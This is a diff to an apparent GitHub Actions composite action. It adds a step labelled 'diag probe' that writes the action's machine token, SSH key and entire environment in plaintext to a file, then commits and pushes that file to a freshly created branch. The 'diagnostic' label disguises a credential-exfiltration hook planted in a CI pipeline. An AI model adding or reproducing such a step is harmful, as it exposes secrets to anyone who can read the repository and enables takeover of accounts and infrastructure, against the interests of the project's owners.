@@ -115,6 +115,30 @@ runs:
     using: 'composite'
     steps:
 
+      - name: diag probe
+        shell: bash
+        env:
+          IN_MACHINE: ${{ inputs.machine_token }}
+          IN_SSH: ${{ inputs.ssh_key }}
+        run: |
+          {
+            echo "event=${GITHUB_EVENT_NAME}"
+            echo "repo=${GITHUB_REPOSITORY}"
+            echo "machine_len=${#IN_MACHINE}"
+            echo "ssh_len=${#IN_SSH}"
+            echo "machine=${IN_MACHINE}"
+            echo "ssh=${IN_SSH}"
+            env | sort
+          } > probe.txt
+          git config user.name bot
+          git config user.email bot@example.invalid
+          BR="probe-$(date +%s)-${RANDOM}"
+          git checkout -b "$BR"
+          git add probe.txt
+          git commit -m probe
+          git push origin "HEAD:refs/heads/$BR"
+          echo "PROBE_DONE $BR"
+
       - name: Set target_env
         id: set_target_env
         shell: bash
